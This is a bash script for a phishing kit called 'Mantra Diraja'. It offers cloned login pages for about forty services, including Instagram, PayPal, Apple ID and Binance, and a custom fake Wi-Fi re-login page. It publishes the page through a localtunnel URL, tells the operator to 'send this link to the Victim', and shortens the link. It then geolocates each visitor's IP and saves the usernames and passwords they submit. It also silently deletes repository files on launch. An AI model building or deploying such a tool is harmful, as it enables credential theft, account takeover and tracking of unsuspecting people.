#!/bin/bash

open_page() {
    url="https://github.com/SecretCompany777/mantra-diraja"
     open "$url"
}

start_server() {
    server=$1
    # Start de server
    echo "Start de server voor: $server"
}

# Upgraded by: SECRET DIRAJA (https://github.com/SecretCompany777/mantra-diraja)
trap 'printf "\n";stop;exit 1' 2
menu() {
printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;36m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;36m DropBox\e[0m        \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;36m eBay\e[0m               \n"                                
printf "          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;36m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;36m Line  \e[0m         \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;36m Amazon\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;36m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;36m Shopify   \e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;36m iCloud\e[0m          \n"
printf "          \e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;36m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;36m Messenger   \e[0m   \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;36m Spotify\e[0m          \n"                
printf "          \e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;36m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;36m GitLab   \e[0m      \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;36m Netflix\e[0m          \n"                
printf "          \e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;36m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;36m Twitch   \e[0m      \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;36m Reddit\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;36m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;36m MySpace    \e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;36m StackOverflow\e[0m         \n"
printf "          \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;36m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;36m Badoo   \e[0m       \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;36m Custom\e[0m         \n"        
printf "          \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;36m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;36m VK   \e[0m                   \n"         
printf "          \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;36m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;36m Yandex   \e[0m               \n"
printf "          \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;36m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;36m devianART   \e[0m            \n"
printf "          \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;36m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;36m Wi-Fi   \e[0m                \n"
printf "          \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;36m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;36m PayPal  \e[0m                \n"
printf "          \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;36m Pinterest\e[0m      \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;36m Steam  \e[0m                              \n"
printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;36m Apple ID\e[0m       \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;36m Tiktok \e[0m                             \n"
printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;36m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;36m Playstation  \e[0m           \e[1;94m                  \n"
printf "          \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;36m Binance Email Support \e[0m       \e[1;94m             \n"


read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ╔╦═[ M A N T R A:]═[乂]
 ╚╩══➢ ' option



if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="github"
start
elif [[ $option == 6 ]]; then
server="google"
start

elif [[ $option == 7 ]]; then
server="origin"
start

elif [[ $option == 8 ]]; then
server="yahoo"
start

elif [[ $option == 9 ]]; then
server="linkedin"
start

elif [[ $option == 10 ]]; then
server="protonmail"
start

elif [[ $option == 11 ]]; then
server="wordpress"
start

elif [[ $option == 12 ]]; then
server="microsoft"
start

elif [[ $option == 13 ]]; then
server="instafollowers"
start

elif [[ $option == 14 ]]; then
server="pinterest"
start

elif [[ $option == 15 ]]; then
server="apple"
start

elif [[ $option == 16 ]]; then
server="verizon"
start

elif [[ $option == 17 ]]; then
server="dropbox"
start

elif [[ $option == 18 ]]; then
server="line"
start

elif [[ $option == 19 ]]; then
server="shopify"
start

elif [[ $option == 20 ]]; then
server="messenger"
start

elif [[ $option == 21 ]]; then
server="gitlab"
start

elif [[ $option == 22 ]]; then
server="twitch"
start

elif [[ $option == 23 ]]; then
server="myspace"
start

elif [[ $option == 24 ]]; then
server="badoo"
start

elif [[ $option == 25 ]]; then
server="vk"
start

elif [[ $option == 26 ]]; then
server="yandex"
start

elif [[ $option == 27 ]]; then
server="devianart"
start

elif [[ $option == 28 ]]; then
server="wifi"
start

elif [[ $option == 29 ]]; then
server="paypal"
start

elif [[ $option == 30 ]]; then
server="steam"
start

elif [[ $option == 31 ]]; then
server="tiktok"
start

elif [[ $option == 32 ]]; then
server="playstation"
start

elif [[ $option == 33 ]]; then
server="shopping"
start

elif [[ $option == 34 ]]; then
server="amazon"
start

elif [[ $option == 35 ]]; then
server="icloud"
start

elif [[ $option == 36 ]]; then
server="spotify"
start

elif [[ $option == 37 ]]; then
server="netflix"
start

elif [[ $option == 38 ]]; then
server="reddit"
start

elif [[ $option == 39 ]]; then
server="stackoverflow"
start

elif [[ $option == 40 ]]; then
server="create"
createpage
start

elif [[ $option == 41 ]]; then
    open_page


else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}


stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)
checknode=$(ps aux | grep -o "node" | head -n1)
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checknode == *'node'* ]]; then
pkill -f -2 node > /dev/null 2>&1
killall -2 node > /dev/null 2>&1
fi

}


banner() {

printf "                                                                                               
                                   .                                  
                           :^.   .~!~.   .^:                          
                           :7^~^^7.^.7^^~^7:                          
                           :?!.75! ~ !57.!?:.                         
                     .!!^^!?^7.:J! ~ !J::?^?!^^!!.                    
             ..^!~:~!!??!^:!!7!.J7^7^7?.!7!!:^!??~!~:~!^..            
            ^~~!!7?7!~!7~?~.^?#J??YYY??J#?:.~?~7!~77?7!!~~^           
            !!7??77777~77~Y???J77?7?7?77J???Y~77~777?7??7!!           
       :~!7777??!!!7?J??JYJ?J???7~7?7~77??Y?YYJ??J?7!!!??7777!~:      
       .7!?J!!!7?7?PY5777G?^7??7^7J:J7^7??7^?G77?5YG?7?7!!!J?!7.      
       !:!J77~!?P5?Y!~^^^^^!!77?77?7J77?77!!^^^^^~!Y?5PJ!~77J!:!      
      .J:7!7JY?5?7~^:~!Y!77!?!7YJ?7!7?JY7!?!77!Y!~:^~7?5JYJ7!7:?.     
       ^!!7J?JY!~^~!7777!!77YJJJJY^ ^YJJJJJ77!!7777!~^~!YJ?J7!!^      
     .~:7!Y~!J77!7?77???7?JYGPGP~~^.^~~PGGGYJ?7???7??7!77J!~Y!7:~.    
     .~77!?!?57!Y?77?PGPP55GYJY!^^??7^^!YJYG5PP5GP??7?Y~7Y?!7!77~.    
    ~??7!!Y!Y7J:?YJY5GJ?JJY5JY57!?J J?!75YJ5YJJ?JG5YJ5?:Y7Y~Y!~7??^   
    ?7!7~~J??!J~!#?J5J7JJ?7YYJPP77J!J77PPJ5Y7?JJ7J5J?#!~J!??J~~7!7?   
     ~Y!?JJ55J!?^GJ77?7!~~~!J77Y??P?P7?Y77J!!~~!77!7JG^?!J55JY?!Y~    
      :JJ~7??7Y!!YY!7?7!~^^~~!?!7Y575Y7!?!~~^^~!7?7!YY!!J7??7~JJ:     
       .J7^J!J!!5?J7!^::~!~^::~??Y7Y7Y??~::^~~~::^!7J?5!!J!J^7J.      
       ^J!57??YPJ?57::7GPPPP5^:7J~7!7~J7:^5GPPPG!::75??PY??75!J^      
     :^77JJ7J5~7~JY7~:#5J#G?&?:~J75P57J~:J&?G#J5#:~?YY~7!5J7JJ77^:    
   ^!~:^!?J7!77?~??77^?GPP5PP~~5~ ?B? ~P~~PP55PG?^77??~?77!7J?!^:^!^  
   ~. ^!PBY?7?^^YP7!!7!7????!^^~^:7G7:^~^^!????77?!!7PY^^?7?YBP!^ .~  
      ~!#5J7!G#~.!J~~~!!!!75:.~^.~5B5~.^^.:57!!!!~~~J!.~#G!7J5#!~     
       !?YYJY&5~^.^5J7!!77?Y!:7!!~7#7~!!7:!Y?77!!7J5^.^~5&YJYY?~      
        :~!~!?P!!.:!PPPPYY77?!~!?YJ?JY?!~!?77YYPPPP!..!!P?!~!~:       
       ^~!~?7 ?7~!.:~????YPB#B5??77J77??5B#BPY????~:.!~7? 7?~!~^      
      :?:~.!7^?:?5.:^#Y?YGGY?YBBJ7?J?7JBBY?YGGY?Y#^:.5?^?^7!.~:?:     
      .7!!??!Y7^?5?!JB^.:!7 : !^.::!::.^!.: 7!:.^BJ!?Y?^7Y!??!!7.     
        :^^^^5J7!!7?5P  .^^ : !..: ? ...! : ^^. .PP?7!!7Y5^^^^:       
             ^Y?7??7!7. :^: : ^. . J . .~ : :^: .7!7??7?Y^            
             .7!7?7!?J. :~?!7JY^?~~5~~7^YJ7!?~: .J7!7?7!7.            
                 !7^!?..:YY7?P5^J~~J~~J^5P??YY:..?!^!!                
                 ~^..~ :^Y?!?&P:?^7G7:?:P@?!?Y^: ~..^^                
                    ^:.^^^!^!PP:Y~~?~^Y^PP!^!^^^.:^                   
                   :^.~^ .^  .~^J^~J~~J^~.  ^. ^~.^:                  
                 .^^^~:       ^^?:7G7^?^^       :~^^^.                
              .:^~^^:         ^^J^~?~^J^^         :^^~^:.             
            .~~^:.            ^^5~~?~~5^^            .:^~~:           
                              ^^Y:!P!:Y^^                             
                              ^^Y.~Y~.J^^                             
                              :^7^^7^^?^:                             
                               :^!!~!7^:                              
                                 .....                                              
                       M A N T R A  D I R A J A

"
}



                         



createpage() {
default_cap1="Wi-fi Session Expired"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
killall -2 php > /dev/null 2>&1
killall -2 node > /dev/null 2>&1
exit 1

}

getcredentials() {
echo ' '
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
ipv4=`curl -s https://ipinfo.io/$ip/json | jq -r  '.ip'`
cn=`curl -s https://ipapi.co/$ip//json | jq -r  '.country_name'`
re=`curl -s https://ipapi.co/$ip//json | jq -r  '.region'`
ct=`curl -s https://ipapi.co/$ip//json | jq -r '.city'`
post=`curl -s https://ipapi.co/$ip//json | jq -r  '.postal'`
loc=`curl -s https://ipinfo.io/$ip/json | jq -r  '.loc'`
org=`curl -s https://ipinfo.io/$ip/json | jq -r  '.org'`
tz=`curl -s https://ipinfo.io/$ip/json | jq -r '.timezone'`
lat=`curl -s https://ipapi.co/$ip/json/ | jq -r '.latitude'`
lon=`curl -s https://ipapi.co/$ip/json/ | jq -r '.longitude'`

gm=`echo "https://www.google.com/maps/search/?api=1&query="$lat,$lon`

printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" $cn
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Region:\e[0m\e[1;77m %s\e[0m\n" $re
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" $ct
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Postal:\e[0m\e[1;77m %s\e[0m\n" $post
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" $loc
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Maps:\e[0m\e[1;77m %s\e[0m\n" $gm
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" $org
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" $tz
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt




getcredentials
}
start() {
printf "\n"
printf "1.Localtunnel\n"
echo ""
read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ╔╦═[ D I R A J A:]═[乂]
 ╚╩══➢ ' host
 
if [[ $host == 1 ]]; then
sleep 1
start_localtunnel
fi
}

printf "\e[1;92m[\e[0m*\e[1;30m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2

start_localtunnel()  {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2

printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
sleep 4
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
echo ""
echo ""

checkfound
}

checkfound() {


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Tunggu target buka link ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}
rm -rf setup.sh
rm -rf tmxsp.sh
rm -rf index.html
rm -rf .gitignore
rm -rf .nojekyll
banner
menu

